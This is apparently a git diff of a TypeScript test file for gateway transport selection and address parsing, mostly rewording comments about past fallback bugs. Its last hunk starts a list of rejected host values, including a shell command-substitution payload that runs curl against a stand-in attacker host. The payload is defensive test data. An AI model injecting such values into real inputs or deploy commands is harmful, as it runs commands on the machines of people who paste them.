@@ -71,8 +71,7 @@ describe("resolveTransports", () => {
     ).toMatchObject({ hasTransport: false });
   });
 
-  // The bug this covers: a dual gateway was handed direct with no relay credentials, so a broken
-  // direct address failed every operation instead of falling back.
+  // Covers a real bug: a dual gateway got direct with no relay credentials, so it could not fall back.
   test("a healthy dual gateway prefers direct but carries relay credentials for the fallback", () => {
     expect(resolveTransports({ gateway: { ...dual, directHeartbeat: fresh } })).toEqual({
       useDirect: true,
@@ -143,8 +142,7 @@ describe("resolveClientTransports", () => {
     });
   });
 
-  // The bug this covers: direct was handed out on client capability alone, so a dual gateway with a
-  // dead direct address made every session pay the direct handshake timeout before falling back.
+  // Covers a real bug: direct went out on client capability alone, so every session paid the timeout.
   test("a stale direct probe is skipped when the relay can take over", () => {
     expect(
       resolveClientTransports({
@@ -214,8 +212,7 @@ describe("parseDirectAddress", () => {
     expect(parseDirectAddress(address)).toEqual({ host, port });
   });
 
-  // The address is interpolated into copy-and-run deploy commands, so a host carrying shell syntax
-  // would execute on the machine of whoever pastes the command. The URL parser alone allows these.
+  // These reach copy-and-run deploy commands, and the URL parser alone accepts every one of them.
   /* eslint-disable no-template-curly-in-string -- ${IFS} is literal payload text, not interpolation */
   test.each([
     "$(curl${IFS}attacker.example).x:8443",
